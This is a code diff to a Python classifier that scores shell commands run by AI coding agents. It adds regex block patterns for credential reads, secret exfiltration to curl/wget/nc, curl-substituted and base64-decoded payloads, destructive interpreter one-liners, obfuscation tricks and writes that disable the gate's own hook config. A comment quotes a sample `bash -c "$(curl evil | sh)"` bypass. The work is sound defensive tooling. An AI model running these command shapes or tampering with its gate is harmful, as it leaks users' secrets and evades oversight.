@@ -173,12 +173,107 @@ CRITICAL_COMMAND_PATTERNS: Final[tuple[tuple[str, str, str], ...]] = (
     (r"\bterraform\s+(?:destroy|apply\s+-auto-approve)", "terraform destroy / auto-apply",
      "Always plan first: `terraform plan -out=plan.tfplan`, review, then "
      "`terraform apply plan.tfplan`. Never auto-approve in prod"),
-    # Secret exfil shape
-    (r"\bcat\b.*~/\.(?:ssh|aws|kube)/", "read ~/.ssh ~/.aws ~/.kube",
+    # Secret exfil shape - widened to cover the credential dirs the kill-test
+    # called out (gh, docker, .npmrc, .pypirc, .netrc, ssh keys by canonical
+    # name). The pattern is intentionally read-action-agnostic: a credential
+    # file reaching ANY command is suspicious, but the most common verbs are
+    # cat/head/tail/less/more/xxd/od/strings/base64.
+    (r"\b(?:cat|head|tail|less|more|xxd|od|strings|base64)\b.*(?:~|\$\{?HOME\}?)/?\.(?:ssh|aws|kube|config/gh|docker|gnupg)\b",
+     "read ~/.ssh ~/.aws ~/.kube ~/.config/gh ~/.docker ~/.gnupg",
      "If you need a credential value, read the specific file you mean and "
      "redact for display: `head -c 20 <file>; echo '...'`"),
-    (r"\bcat\b\s+\.env\b", "read .env",
+    (r"\b(?:cat|head|tail|less|more|xxd|od|strings|base64)\b.*\b(?:\.npmrc|\.pypirc|\.netrc|id_rsa|id_ed25519|id_ecdsa|id_dsa)\b",
+     "read credential file (.npmrc, .pypirc, .netrc, ssh private key)",
+     "Use the tool's auth helper instead (npm whoami, gh auth status, ssh-agent) "
+     "rather than reading the raw credential"),
+    (r"\b(?:cat|head|tail|less|more)\b\s+(?:[^|]*\s)?\.env\b", "read .env",
      "Show only keys, not values: `grep -oE '^[A-Z_]+=' .env`"),
+    # Find + exfil: `find $HOME -name "*.env" -print0 | xargs -0 cat` style.
+    # The kill-test called this out specifically as a bypass shape.
+    (r"\bfind\b[^|]+-name\s+(?:[\"']?)[^\"' ]*\.(?:env|pem|key)(?:[\"']?)",
+     "find by credential-file extension",
+     "If you need to locate config, use a specific path. Globbing for "
+     "*.env / *.pem / *.key across $HOME is a credential-harvest pattern"),
+    # Pipe credential read to network sink (the bare exfil shape, independent
+    # of trifecta tracking - if it's this shape, it's critical on its own).
+    (r"\b(?:cat|head|tail|xxd|tar|base64)\b[^|;]*(?:credential|secret|token|\.env|\.ssh|\.aws|\.kube|\.netrc|\.npmrc|id_rsa|id_ed25519)[^|;]*\|\s*(?:curl|wget|nc|netcat|httpie?|http)\b",
+     "credential read piped to network sink",
+     "Refuse. This is the credential-exfiltration shape: do not pipe "
+     "credentials or .env into curl/wget/nc"),
+    # Interpreter one-liners that wrap a destructive call. Python's shutil.rmtree,
+    # os.remove, os.unlink, Node fs.rmSync, Ruby FileUtils.rm_rf, Perl unlink/rmtree.
+    # These bypass the literal `rm -rf` pattern by going through the language SDK.
+    (r"\bpython\d?\s+-c\s+[^&|;]*\b(?:shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|pathlib\.[A-Z]\w*\.\s*unlink|subprocess\.[A-Za-z_]+\([^)]*rm)",
+     "python -c with destructive call",
+     "Move the work into a script file you can read first: "
+     "`python /tmp/work.py` after writing /tmp/work.py"),
+    (r"\bnode\s+-e\s+[^&|;]*\b(?:fs\.rmSync|fs\.unlinkSync|fs\.rm\(|fs\.rmdirSync|child_process\.exec[^(]*rm)",
+     "node -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    (r"\bruby\s+-e\s+[^&|;]*\b(?:FileUtils\.rm_rf|FileUtils\.remove_dir|File\.delete|Dir\.delete)",
+     "ruby -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    (r"\bperl\s+-e\s+[^&|;]*\b(?:File::Path::rmtree|unlink|File::Path::remove_tree)",
+     "perl -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    # Shell-fetched payload executed inline: `bash -c "$(curl ...)"` and its
+    # sh / zsh / fish variants. This is the curl|sh shape moved one indirection
+    # to evade the literal pipe-to-shell detector.
+    (r"\b(?:bash|sh|zsh|fish|dash|ksh)\s+-c\s+[\"']?\s*(?:\$\(|`)\s*(?:curl|wget|fetch)\b",
+     "shell -c with curl-substitution payload",
+     "Download to a file first, read it, then run: "
+     "`curl -fsSL <url> -o /tmp/x.sh && cat /tmp/x.sh && bash /tmp/x.sh`"),
+    # Heredoc into an interpreter: `python <<EOF\n...rmtree...\nEOF`. Risk is
+    # the destructive call buried inside the heredoc; same matching shape as
+    # the -c variants above but with `<<` (heredoc) instead of `-c`.
+    (r"\b(?:python\d?|node|ruby|perl)\b[^<]*<<[-~]?\s*['\"]?(?:EOF|PY|JS|RB|PL|HEREDOC|END)",
+     "interpreter heredoc",
+     "Heredocs hide what's about to run. Write the script to a file first "
+     "and run it: `cat > /tmp/work.py <<'EOF' ... EOF && python /tmp/work.py`"),
+    # Base64-decoded payload into shell. `echo <b64> | base64 -d | bash`
+    (r"\bbase64\s+(?:-d|--decode)\b[^|;]*\|\s*(?:bash|sh|zsh|fish|python\d?|node|perl|ruby)\b",
+     "base64-decoded payload piped to interpreter",
+     "Decode to a file first so you can inspect the script before running it"),
+    # Gate self-tamper: a write/delete/in-place-edit targeting Quill's own
+    # config or the host agent's hook settings is an attempt to disable the
+    # gate from inside (the second-review critique's "attacker writes to
+    # settings.json to alter hook routing"). Mutating verb + a gate-config
+    # path. (Within the app-layer model: a write that does NOT go through a
+    # gated tool still bypasses this - see docs/SECURITY-MODEL.md.)
+    (r"(?:>>?|\btee\b|\bsed\s+-i|\btruncate\b|\brm\b|\bmv\b|\bcp\b|\bdd\b|\bln\b)"
+     r"[^|;]*(?:\.claude/settings(?:\.local)?\.json|\.cursor/hooks\.json|"
+     r"\.quill/(?:config\.toml|key|overrides\.toml))",
+     "write/delete targeting the gate's own config (settings.json / config.toml)",
+     "Editing the gate's config to disable it is a privilege-escalation shape. "
+     "Change policy deliberately via `quill` commands, not by rewriting the files"),
+)
+
+# Private-data-read shapes. These DON'T classify to critical by themselves
+# (an operator might legitimately `printenv` to debug) but they DO mark the
+# session's taint state as "has accessed private data," which the lethal-
+# trifecta detector uses to escalate the third edge to a deny. The kill-test
+# called out env / printenv / .npmrc / gh hosts / docker config / netrc as
+# common credential-read shapes the LOW classifier was missing.
+#
+# These are returned as HIGH (not LOW) so the operator sees them once, and
+# the audit log carries the explicit `private_data_read` reason so insights
+# can later spot suspicious patterns.
+PRIVATE_READ_PATTERNS: Final[tuple[tuple[str, str, str], ...]] = (
+    # Bare / piped / redirected dump only. `printenv PATH` (a single named
+    # variable) is the targeted read the suggestion itself recommends, so it
+    # stays LOW.
+    (r"^\s*(?:env|printenv)\s*(?:$|\||>)",
+     "env/printenv dumps environment (often contains secrets)",
+     "If you need a specific value, ask for it by name: `echo $MY_VAR`. "
+     "Dumping the whole environment to an agent's context is a credential "
+     "exposure shape"),
+    (r"\b(?:cat|head|tail|less|more|xxd|od|strings|base64)\b\s+(?:[^|;]*\s)?(?:~|\$\{?HOME\}?)/?\.(?:config/gh|docker|gnupg|kube|aws|ssh)\b",
+     "read credential directory",
+     "Use the tool's auth helper (gh auth status, aws sts get-caller-identity) "
+     "instead of cat'ing the raw config"),
+    (r"\b(?:cat|head|tail|less|more|xxd|od|strings|base64)\b[^|;]*(?:\.npmrc|\.pypirc|\.netrc|id_rsa|id_ed25519|id_ecdsa|id_dsa)\b",
+     "read credential file",
+     "Use the package manager's auth helper rather than reading the raw token"),
 )
 
 HIGH_COMMAND_PATTERNS: Final[tuple[tuple[str, str, str], ...]] = (
@@ -249,6 +344,77 @@ _HIGH_CMD_RE: Final[tuple[tuple[re.Pattern[str], str, str], ...]] = tuple(
 _LOW_CMD_RE: Final[tuple[re.Pattern[str], ...]] = tuple(
     re.compile(p, re.IGNORECASE) for p in LOW_COMMAND_PATTERNS
 )
+_PRIVATE_READ_RE: Final[tuple[tuple[re.Pattern[str], str, str], ...]] = tuple(
+    (re.compile(p, re.IGNORECASE), r, s) for p, r, s in PRIVATE_READ_PATTERNS
+)
+
+# Patterns that must see the RAW (un-quote-masked) command, because the
+# dangerous token legitimately lives inside quotes and masking would erase
+# it: a heredoc delimiter (`<<'PY'`) and a credential-glob filename
+# (`-name "*.env"`). These are anchored tightly enough that quoted PROSE
+# (e.g. `echo "how to use a heredoc"`) won't match - the interpreter/find
+# verb is required at the start of a command segment.
+RAW_CRITICAL_COMMAND_PATTERNS: Final[tuple[tuple[str, str, str], ...]] = (
+    # Interpreter heredoc: `python - <<'PY' ... PY`, `node <<JS`, etc. The
+    # delimiter is commonly single-quoted, which the masker blanks; scan raw.
+    (r"(?:^|[;&|]\s*)(?:python\d?|node|ruby|perl|bash|sh|zsh)\b[^<\n]*<<[-~]?\s*['\"]?"
+     r"(?:EOF|PY|JS|RB|PL|SH|HEREDOC|END)\b",
+     "interpreter heredoc",
+     "Heredocs hide what's about to run. Write the script to a file first "
+     "and run it: `cat > /tmp/work.py <<'EOF' ... EOF && python /tmp/work.py`"),
+    # find for credential-file extensions, with the glob commonly quoted
+    # (`-name "*.env"`). Masking blanks the quoted glob; scan raw.
+    (r"(?:^|[;&|]\s*)find\b[^|\n]+-name\s+['\"]?\*?\.(?:env|pem|key)\b",
+     "find by credential-file extension",
+     "Globbing for *.env / *.pem / *.key is a credential-harvest pattern. "
+     "Use a specific path instead of scanning the tree"),
+    # Interpreter one-liners that wrap a destructive call. The code lives
+    # inside the `-c "..."` / `-e "..."` quotes, which masking blanks - so
+    # these must scan raw. Anchored to a leading interpreter verb so that
+    # `echo "python -c shutil.rmtree(...)"` (the verb mid-string) does not
+    # false-fire.
+    (r"(?:^|[;&|]\s*)python\d?\s+-c\b.*?"
+     r"(?:shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|pathlib\.[A-Z]\w*\s*\.\s*unlink)",
+     "python -c with destructive call",
+     "Move the work into a script file you can read first: "
+     "`python /tmp/work.py` after writing /tmp/work.py"),
+    (r"(?:^|[;&|]\s*)node\s+-e\b.*?"
+     r"(?:\brmSync\b|\bunlinkSync\b|\brmdirSync\b|fs\.rm\()",
+     "node -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    (r"(?:^|[;&|]\s*)ruby\s+-e\b.*?"
+     r"(?:FileUtils\.rm_rf|FileUtils\.remove_dir|File\.delete|Dir\.delete)",
+     "ruby -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    (r"(?:^|[;&|]\s*)perl\s+-e\b.*?"
+     r"(?:File::Path::rmtree|File::Path::remove_tree|unlink)",
+     "perl -e with destructive call",
+     "Write the script to a file first so it can be reviewed"),
+    # Obfuscation catches - DEFENSE-IN-DEPTH, not a hard boundary. A
+    # determined adversary has effectively infinite shell-grammar tricks to
+    # reconstruct a command (string-splitting, hex/oct escapes, printf
+    # assembly, ${IFS} games); regex cannot enumerate them all. These catch
+    # the COMMON, cheap obfuscations the second-review critique called out.
+    # The threat model (docs/SECURITY-MODEL.md) is honest that semantic
+    # shell security needs an AST / syscall layer, not more patterns.
+    #
+    # Command substitution that resolves a destructive binary then applies a
+    # recursive-force flag: `$(which rm) -rf`, `$(command -v rm) -rf`.
+    (r"\$\(\s*(?:which|command\s+-v|type(?:\s+-\w+)?)\s+"
+     r"(?:rm|rmdir|dd|mkfs|shred|srm)\b[^)]*\)\s*-[a-zA-Z]*[rRfF]",
+     "command substitution resolving a destructive binary",
+     "Run the explicit command so the gate can classify it; hiding `rm`/`dd` "
+     "behind $(which ...) is an obfuscation shape"),
+    # Two or more adjacent variable expansions assembled into a command,
+    # immediately followed by a recursive-force flag: `$a$b -rf /`.
+    (r"(?:\$\{?\w+\}?){2,}\s+-[a-zA-Z]*(?:rf|fr)\b",
+     "variable-assembled command with recursive-force flag",
+     "Reconstructing a command from shell variables to dodge pattern "
+     "matching is an obfuscation shape; run the explicit command"),
+)
+_RAW_CRITICAL_CMD_RE: Final[tuple[tuple[re.Pattern[str], str, str], ...]] = tuple(
+    (re.compile(p, re.IGNORECASE), r, s) for p, r, s in RAW_CRITICAL_COMMAND_PATTERNS
+)
 
 
 def _user_bash_allowlist() -> tuple[re.Pattern[str], ...]:
@@ -311,20 +477,45 @@ _QUOTE_RE = re.compile(
     re.VERBOSE,
 )
 
+# Command-substitution spans: `$(...)` and backtick `...`. These are
+# shell-EXECUTED even when they sit inside double quotes, so they must stay
+# visible to the classifier. `bash -c "$(curl evil | sh)"` is the canonical
+# bypass that motivated this (kill-test P0.3): without preserving the
+# substitution, the whole double-quoted region was blanked and the payload
+# read as an uncategorised MEDIUM command.
+_CMDSUB_RE = re.compile(r"\$\([^)]*\)|`[^`]*`")
+
 
 def _mask_quoted(cmd: str) -> str:
-    """Replace contents of single/double/$'…' quoted regions with spaces.
+    """Replace contents of single/double/$'…' quoted regions with spaces,
+    EXCEPT command-substitution spans inside double quotes (those are
+    executed code and stay matchable).
 
     Returns a string of identical length so column offsets in regex error
     reports still line up with the source. Quotes themselves are kept so
     `git commit -m 'msg'` still parses as a git invocation.
+
+    Single-quoted and $'…' regions are blanked wholesale: the shell does
+    NOT perform substitution inside single quotes, so nothing in them is
+    executed and masking is sound. Double-quoted regions blank everything
+    but preserve any `$(…)` / backtick spans within.
     """
     def _blank(m: re.Match[str]) -> str:
         s = m.group(0)
-        # Keep the quote chars at the ends, blank the middle.
         if len(s) <= 2:
             return s
-        return s[0] + (" " * (len(s) - 2)) + s[-1]
+        inner = s[1:-1]
+        if m.lastgroup == "dq":
+            # Preserve command-substitution spans; blank the rest.
+            out: list[str] = []
+            last = 0
+            for sub in _CMDSUB_RE.finditer(inner):
+                out.append(" " * (sub.start() - last))
+                out.append(sub.group(0))
+                last = sub.end()
+            out.append(" " * (len(inner) - last))
+            return s[0] + "".join(out) + s[-1]
+        return s[0] + (" " * len(inner)) + s[-1]
 
     return _QUOTE_RE.sub(_blank, cmd)
 
@@ -357,6 +548,17 @@ def _count_chain_segments(cmd: str) -> int:
     return sum(1 for p in parts if p.strip())
 
 
+def _is_wildcard_pattern(rex: re.Pattern[str]) -> bool:
+    """True if a user-supplied allowlist regex is so broad it would let any
+    command through. Catches `.*`, `.+`, `^.*$`, `^.+$`, and similar empty-or-
+    universal patterns. Compared in the kill-test section P0.1: an operator
+    allowlist with `.*` should NEVER be allowed to silently downgrade
+    rm -rf or sudo or DROP TABLE - we refuse to honor wildcard entries
+    entirely. They're either a typo or a config-tamper attempt."""
+    p = rex.pattern.strip()
+    return p in {".*", ".+", "^.*$", "^.+$", "^.*", "^.+", ".*$", ".+$", ""}
+
+
 def classify_command(command: str) -> CommandClassification:
     """Classify a single shell command by content.
 
@@ -365,23 +567,32 @@ def classify_command(command: str) -> CommandClassification:
     return MEDIUM and let the caller decide. CRITICAL/HIGH classifications
     carry a paste-able safer-alternative `suggestion`.
 
-    Security gates (ordered):
-      1. User allowlist (`[bash] allowlist`) short-circuits to LOW.
-      2. Subcommand-chain bypass guard: commands with >SUBCOMMAND_CHAIN_LIMIT
+    Security gates (ordered - this ordering is load-bearing):
+      1. Subcommand-chain bypass guard: commands with >SUBCOMMAND_CHAIN_LIMIT
          segments are CRITICAL regardless of content (CVE-2025-59536 class).
-      3. Pattern matching runs on the *quote-masked* form so SQL/destructive
-         keywords inside commit messages or echo literals don't false-fire.
-      4. The original raw form is used for chain-counting and for the
-         allowlist match (operators may want to allowlist quoted forms).
+      2. CRITICAL pattern matching on the *quote-masked* form. This runs
+         BEFORE the user bash allowlist so an over-broad allowlist
+         (`allowlist = ['.*']`, kill-test P0.1) cannot silently downgrade
+         rm -rf, sudo, DROP TABLE, or any other never-downgradable verb.
+      3. Private-data-read patterns: env/printenv/cat ~/.npmrc and friends
+         classify as HIGH (so the operator sees them once) and the caller
+         can read the `private_read` field to mark trifecta taint.
+      4. User allowlist (`[bash] allowlist`) short-circuits to LOW for the
+         non-critical class. Wildcard-only patterns (`.*`, `.+`) are
+         refused outright - they're typo-or-tamper, not legitimate config.
+      5. HIGH and LOW pattern matching runs on the quote-masked form so
+         dangerous keywords inside commit messages or echo literals don't
+         false-fire.
+
+    See also classify_command_with_taint() for the (risk, private_read?)
+    pair used by the adapter to mark trifecta state.
     """
     cmd = (command or "").strip()
     if not cmd:
         return CommandClassification(Risk.LOW, "empty command")
-    for rex in _user_bash_allowlist():
-        if rex.search(cmd):
-            return CommandClassification(Risk.LOW, "operator allowlist match")
 
     # Gate 1: subcommand-chain bypass (Claude Code CVE-2025-59536 / 21852).
+    # Even if the operator allowlists `.*`, a 20-segment chain stays CRITICAL.
     n_segments = _count_chain_segments(cmd)
     if n_segments > SUBCOMMAND_CHAIN_LIMIT:
         return CommandClassification(
@@ -394,12 +605,40 @@ def classify_command(command: str) -> CommandClassification:
             "file and run it: `bash /tmp/work.sh`",
         )
 
-    # Gate 2: pattern matching on the quote-masked form. Quoted SQL in a
-    # commit message no longer trips DROP/TRUNCATE/DELETE patterns.
+    # Gate 2: CRITICAL pattern matching on the quote-masked form runs FIRST,
+    # before the user allowlist. This is the kill-test P0.1 fix: a user
+    # allowlist must never be able to downgrade the never-downgradable class.
     masked = _mask_quoted(cmd)
     for rex, reason, suggestion in _CRITICAL_CMD_RE:
         if rex.search(masked):
             return CommandClassification(Risk.CRITICAL, reason, suggestion)
+
+    # Gate 2b: a few CRITICAL shapes whose dangerous token legitimately
+    # lives inside quotes (heredoc delimiter, credential-glob filename) and
+    # would be erased by masking. Scanned on the RAW command. Anchored to a
+    # leading interpreter/find verb so quoted prose does not false-fire.
+    for rex, reason, suggestion in _RAW_CRITICAL_CMD_RE:
+        if rex.search(cmd):
+            return CommandClassification(Risk.CRITICAL, reason, suggestion)
+
+    # Gate 3: private-data reads classify as HIGH and carry a sentinel
+    # reason. The adapter parses the reason prefix to set trifecta taint.
+    for rex, reason, suggestion in _PRIVATE_READ_RE:
+        if rex.search(masked):
+            return CommandClassification(
+                Risk.HIGH, f"private_data_read: {reason}", suggestion,
+            )
+
+    # Gate 4: user allowlist may now short-circuit the REMAINING (non-critical,
+    # non-private-read) classifier to LOW. Wildcard-only entries are ignored
+    # rather than honored - kill-test P0.1 hardening.
+    for rex in _user_bash_allowlist():
+        if _is_wildcard_pattern(rex):
+            continue
+        if rex.search(cmd):
+            return CommandClassification(Risk.LOW, "operator allowlist match")
+
+    # Gate 5: HIGH and LOW pattern matching on the quote-masked form.
     for rex, reason, suggestion in _HIGH_CMD_RE:
         if rex.search(masked):
             return CommandClassification(Risk.HIGH, reason, suggestion)
@@ -407,6 +646,15 @@ def classify_command(command: str) -> CommandClassification:
         if rex.search(masked):
             return CommandClassification(Risk.LOW, "read-only command")
     return CommandClassification(Risk.MEDIUM, "uncategorised shell command")
+
+
+def classify_command_with_taint(command: str) -> tuple[CommandClassification, bool]:
+    """Like classify_command, but also returns whether the command is a
+    private-data read (env/printenv/credential-dir cat). The adapter uses
+    this to set TaintState.has_accessed_private so a subsequent untrusted-
+    input + exfil-vector combination escalates to a trifecta deny."""
+    c = classify_command(command)
+    return c, c.reason.startswith("private_data_read:")
 
 
 @dataclass(frozen=True, slots=True)
